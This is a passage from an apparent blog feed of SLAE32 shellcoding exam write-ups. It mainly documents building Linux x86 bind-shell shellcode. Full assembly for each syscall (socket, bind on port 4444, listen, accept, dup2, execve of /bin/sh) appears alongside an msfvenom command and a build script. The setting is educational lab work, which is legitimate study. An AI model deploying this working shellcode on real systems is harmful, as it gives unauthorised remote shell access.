&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/bindshell# cat ../compile.sh 
#! /bin/bash

echo &apos;[+] Assembling with NASM&apos;
nasm -f elf -o $1.o $1.nasm

echo &apos;[+] Linking ..&apos;
ld -m elf_i386 $1.o -o $1

echo &apos;[+] Done!&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And finally, we launch the netcat tool and then the reverse shellcode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment2/assignment2.2.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:500px;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment2/assignment2.3.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:500px;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment2/assignment2.4.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:500px;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Create a Shell_Reverse_TCP Shellcode: Reverse connects to configured IP and Port; Execs Shell on sucessfull connection; IP and Port should be easily configurable.</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/09/14/Assign1-Bind.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-09-14T08:45:58+02:00</published><updated>2022-09-14T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/09/14/Assign1-Bind</id><content type="html" xml:base="http://localhost:4000/slae32/2022/09/14/Assign1-Bind.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Create a Shell_Bind_TCP Shellcode:
    &lt;ul&gt;
      &lt;li&gt;Binds to a port;&lt;/li&gt;
      &lt;li&gt;Execs Shell on incoming connection;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Port should be easily configurable.&lt;/li&gt;
&lt;/ul&gt;

&lt;!--more--&gt;

&lt;h3 id=&quot;-msfvenom-example--socket_call-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; MSFVenom example &amp;amp; Socket_call &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;To perform this exercise, we started by analysing the bind shell code of Metasploit to see how it works and what syscall are made. To do so, we followed the steps as follows to create an image of the different syscalls performed and to make it more visible.&lt;/p&gt;

&lt;p&gt;As follows the command lines to generate the graphical diagram of the metasploit bind shell :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/shell_bind_tcp R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G shell_bind_tcp.dot
//Then convert into PNG file :
dot shell_bind_tcp.dot -Tpng -o shell_bin_tcp.png 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment1/shell_bin_tcp.png&quot; alt=&quot;drawing&quot; style=&quot;max-width:100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, there are 6 syscalls performed :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;socket,&lt;/li&gt;
  &lt;li&gt;bind,&lt;/li&gt;
  &lt;li&gt;listen,&lt;/li&gt;
  &lt;li&gt;accept,&lt;/li&gt;
  &lt;li&gt;dup2,&lt;/li&gt;
  &lt;li&gt;execve.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each of them will be detailled in the following section.&lt;/p&gt;

&lt;h3 id=&quot;-socketcall-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Socketcall &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;The first thing that we identified in the first syscall is the EAX value set to 0x66 (102 in decimal) related as we can see below to the “socketcall” syscall.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 102
#define __NR_socketcall 102
#define __NR_socket 359
#define __NR_socketpair 360
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then we look into more details about that syscall:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 socketcall
int socketcall(int call, unsigned long *args);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The socketcall is composed of two parameters:&lt;/p&gt;

&lt;p&gt;1) int call - Type of the syscall (socket, bind, …)&lt;/p&gt;

&lt;p&gt;2) unsigned long* args - Arguments of the desired syscall&lt;/p&gt;

&lt;h3 id=&quot;-socket-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Socket &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;The socket syscall creates a socket which will listen to the incoming connections.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 socket 
int socket(int domain, int type, int protocol)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The syscall is composed of the following parameters:&lt;/p&gt;

&lt;p&gt;1) int domain - The protocol family used (AF_INET, AF_LOCAL, …)&lt;/p&gt;

&lt;p&gt;2) int type - The type of the service (TCP, UDP, …)&lt;/p&gt;

&lt;p&gt;3) int protocol - Specify if a particular protocol will be used with the socket (0 most of the time)&lt;/p&gt;

&lt;p&gt;Note: More details can be find on the possible parameter values in the following paths:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;/usr/include/x86_64-linux-gnu/bits/socket.h (DOMAIN AND PROTOCOLS parameters)&lt;/li&gt;
  &lt;li&gt;/usr/include/x86_64-linux-gnu/bits/socket_type.h (TYPE parameter)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, we want to set the following parameters:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x66 (socketcall syscall)&lt;/li&gt;
  &lt;li&gt;EBX = 0x1 (SOCKET syscall)&lt;/li&gt;
  &lt;li&gt;ECX (Address pointing to the arguments into the stack):
    &lt;ul&gt;
      &lt;li&gt;ECX[0] = 0x2 (PF_INET/AF_INET, IP protocol family)&lt;/li&gt;
      &lt;li&gt;ECX[1] = 0x1 (SOCK_STREAM, TCP connection based)&lt;/li&gt;
      &lt;li&gt;ECX[2] = 0x0 (Unspecified)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After that the syscall is performed with success, the file descriptor returned will be stored in the EAX register.&lt;/p&gt;

&lt;p&gt;Useful link : The details of the &lt;em&gt;socket&lt;/em&gt; can be find in the following links :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://shtroumbiniouf.free.fr/CoursInfo/Reseau2/Cours/SocketsBSD/SocketsBSD.html&quot; style=&quot;color:#2d8fb3;&quot;&gt;shtroumbiniouf.free.fr (French link)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://sdz.tdct.org/sdz/les-sockets.html&quot; style=&quot;color:#2d8fb3;&quot;&gt;sdz.tdct.org (French link)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; EBX
xor ebx, ebx
push ebx ; push the x00000000 on the stack
inc ebx ; SYS_SOCKET call 1 for socket
push ebx ; push the 0x00000001 on the stack for the domain AF_INET of the SYS_SOCKET call 
; ECX
push byte 0x2 ; push the 0x00000002 on the stack for the type SOCK_STREAM
mov ecx, esp ; put the arguments of the socketcall into ECX
; EAX
xor eax, eax
mov al, 0x66
; socket call
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-bind-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Bind &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;After the creation of the socket we need to bind it to an address.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 bind 
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With:&lt;/p&gt;

&lt;p&gt;1) sockfd : File descriptor, return value of the socket syscall&lt;/p&gt;

&lt;p&gt;2) sockaddr *addr : address argument which depends on the family&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr {
    sa_family_t sa_family;
    char        sa_data[14];
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In our case, with the Internet Family AF_INET, the address structure will be constructed as follows :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr_in {
    sa_family_t    sin_family; /* address family: AF_INET */
    in_port_t      sin_port;   /* port in network byte order */
    struct in_addr sin_addr;   /* internet address */
};

/* Internet address. */
struct in_addr {
    uint32_t       s_addr;     /* address in network byte order */
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note: From “/usr/src/linux-headers-5.2.0-kali2-common/include/uapi/linux/in.h”&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;addrlen : The size, in bytes, of the address structure pointed to by addr&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Useful Link:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man7/ip.7.html&quot; style=&quot;color:#2d8fb3;&quot;&gt;man7.org (IP manual)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.scip.ch/en/?labs.20200521&quot; style=&quot;color:#2d8fb3;&quot;&gt;www.scip.ch (Example)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This means that we need to pass the following registers:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x66 (SOCKET_CALL)&lt;/li&gt;
  &lt;li&gt;EBX = 0x2 (SYS_BIND)&lt;/li&gt;
  &lt;li&gt;ECX (Address pointing to the arguments into the stack):
    &lt;ul&gt;
      &lt;li&gt;ECX[0] = File descriptor (Return value of the socket syscall)&lt;/li&gt;
      &lt;li&gt;ECX[1] (Address pointing to arguments into the stack):
        &lt;ul&gt;
          &lt;li&gt;ECX[1.0] = 0x2 (AF_INET)&lt;/li&gt;
          &lt;li&gt;ECX[1.1] = 0x115c (port 4444 in hexa)&lt;/li&gt;
          &lt;li&gt;ECX[1.2] = 0x00000000 (IP : 0.0.0.0)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ECX[2] = 0x10 (16 bytes)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The return value stored in EAX should be 0x00 in case of success!&lt;/p&gt;

&lt;p&gt;Note that if we want to set up another IP such as 127.0.0.1, you need to convert each value in hexadecimal and push them in reverse into the stack.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python hex(value)
Result : 
    127 : 0x7f
    0   : 0x00
    0   : 0x00
    1   : 0x1
Then push then into the stack in reverse order (0x0100007f).
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; EBX - SYS_SOCKET call 2 for bind
pop ebx 
; ECX
; Creation of the struct sockaddr_in
xor edi, edi
push edi ; Push on the stack the IP address 0.0.0.0
push word 0x5c11 ; Push on the stack the port 4444 TO MODIFY IF NEEDED
push bx ; Push the Family AF_INET = 2
mov ecx, esp ; mov the structure into ecx
; Put all parameters into ECX
push byte 0x10 ; Push on the stack the address length of 16
push ecx ; 
push eax ; push the file descriptor
mov ecx, esp ; Move the stack into ECX
; EAX
xor eax, eax
mov al, 0x66
; bind call
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-listen-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Listen &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;After that the socket has been binded, we need to listen to this socket. Listen() marks the socket referred by the sockfr as a passive socket, a socket that will be used to accept incoming connection requests using accept().&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 listen
int listen(int sockfd, int backlog)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The syscall is composed of the following arguments:&lt;/p&gt;

&lt;p&gt;1) int sockfd : File descriptor&lt;/p&gt;

&lt;p&gt;2) int backlog : Argument defining the maximum length to which the queue of pending connections for sockfr may grow&lt;/p&gt;

&lt;p&gt;Then we will pass the following arguments :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x66 (SOCKET_CALL)&lt;/li&gt;
  &lt;li&gt;EBX = 0x4 (SYS_LISTEN)&lt;/li&gt;
  &lt;li&gt;ECX (Address pointing to the arguments into the stack):
    &lt;ul&gt;
      &lt;li&gt;ECX[0] = sockfd (file descriptor which is the return value of the socket)&lt;/li&gt;
      &lt;li&gt;ECX[1] = 0x0 (no need of backlog)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The return value stored in EAX must be 0x00 in case of success.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pop esi ; Retrieve the file descriptor
; EAX &amp;amp; ECX backlog
push edi ; Push on the stack 0 for the backlog 
xor eax, eax
mov al, 0x66 ; Set up EAX
; EBX, 4 for listen 
mov bl, 0x4
; ECX 
push esi
mov ecx, esp
; SYS CALL LISTEN
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-accept-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Accept &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;Then, when there is an incoming connection to the socket, we need to accept that connection with the accept() function.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 accept
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The syscall is composed of the following arguments:&lt;/p&gt;

&lt;p&gt;1) int sockfd : File descriptor&lt;/p&gt;

&lt;p&gt;2) struct sockaddr *addr : Pointer to the remote address&lt;/p&gt;

&lt;p&gt;3) socklen_t *addrlen : Pointer to the address length&lt;/p&gt;

&lt;p&gt;Then, we will pass the following arguments :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX = 0x66 (SOCKET_CALL)&lt;/li&gt;
  &lt;li&gt;EBX : 0x5 (SYS_ACCEPT)&lt;/li&gt;
  &lt;li&gt;ECX :
    &lt;ul&gt;
      &lt;li&gt;ECX[0] = sockfd (file descriptor which is the return value of the socket call)&lt;/li&gt;
      &lt;li&gt;ECX[1] = 0x00000000 (Address of the peer socket)&lt;/li&gt;
      &lt;li&gt;ECX[2] = 0x00000000 (NULL because the address is NULL)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;On success, the system call will return in the EAX register a file descriptor for the accepted socket.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; EAX
mov al, 0x66
; EBX 
inc ebx 	; 5 for the ACCEPT SYS CALL
; ECX
push edi	; NULL - address of the peer 
push edi	; NULL 	
push esi	; file descriptor
mov ecx, esp
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-dup2-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Dup2 &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;The next step is to redirect the STDIN, STDOUT and STDER to the socket session. The dup2() system call allocate a new file descriptor that refers to the same open file description as the descriptor oldfd. The file descriptor newfd is ajusted so that it refers to the same open file desdcription as oldfd.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep dup2
    #define __NR_dup2 63
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;-&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 dup2
int dup2(int oldfd, int newfd)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function is composed of:&lt;/p&gt;

&lt;p&gt;1) int oldfd : File descriptor returned by the accept syscall&lt;/p&gt;

&lt;p&gt;2) int newfd : File descriptor that we want to refer to&lt;/p&gt;

&lt;p&gt;We will pass the following arguments :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX : 0x3f (dup syscall, 63 in decimal)&lt;/li&gt;
  &lt;li&gt;EBX : Previous EAX (File descriptor returned by the accept call)&lt;/li&gt;
  &lt;li&gt;ECX : 0x2 to 0x0 (loop IN, OUT, ERR)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To perform the loop, we will use the intruction “JNS rel8” because it perform the jmp until the Sign Flag is set (SF=1), which mean that the zero is taken into account in the loop :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ; EBX, File descriptor return by ACCEPT call
    mov ebx, eax	; Retrieve the file descriptor

    ; EAX, dup2 sys call 0x3f
    xor eax, eax

    ; initialize ECX 
    xor ecx, ecx
    mov cl, 0x2

    ; LOOP

DupLoop :
 
    mov al, 0x3f
    int 0x80
    dec ecx
    jns DupLoop	
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-execve-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Execve &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;Now that we created a socket which is listening and accepting the connections, we will create the part of the code which will launch the execve syscall when someone is connecting to it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;man 2 Execve
int execve(const char *pathname, char *const argv[], char *const envp[])
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The arguments are:&lt;/p&gt;

&lt;p&gt;1) const char *pathname: Pointer to the filename&lt;/p&gt;

&lt;p&gt;2) char *const argv[]: Pointer to the argument of the function&lt;/p&gt;

&lt;p&gt;3) char *const envp[]: Array of pointers to strings passed as environment of the new program&lt;/p&gt;

&lt;p&gt;We will pass the following arguments :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;EAX : 0xb (execve sys call, 11 in decimal)&lt;/li&gt;
  &lt;li&gt;EBX : Pointer to /bin//sh + 0X00000000&lt;/li&gt;
  &lt;li&gt;ECX : Pointer to the address of EBX&lt;/li&gt;
  &lt;li&gt;EDX : NULL&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To pass the argument /bin/sh, we first converted it in hexadecimal and then reverse it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Assembly Code:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; Push the 0x00000000 on the stack
xor eax, eax
push eax
; put the string on the stack
push 0x68732f2f
push 0x6e69622f
; setup EBX with the vlue of ESP
mov ebx, esp
; set up EDX and push null bytes again
push eax
mov edx, esp
; set up ECX argv address on the first dw and null in second dw
push ebx 
; Then move the top of the stack into ECX
mov ecx, esp
; EAX
mov al, 0xb
int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-compilation-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Compilation &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;Then we compiled the code with the following python script :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/bindshell# cat ../compile.sh 
#! /bin/bash

echo &apos;[+] Assembling with NASM&apos;
nasm -f elf -o $1.o $1.nasm

echo &apos;[+] Linking ..&apos;
ld -m elf_i386 $1.o -o $1

echo &apos;[+] Done!&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And finally, we launch the bind shellcode and connect to it with the netcat tool.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment1/assess1-result.PNG&quot; alt=&quot;drawing&quot; style=&quot;max-width:100%;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Create a Shell_Bind_TCP Shellcode: Binds to a port; Execs Shell on incoming connection; Port should be easily configurable.</summary></entry></feed>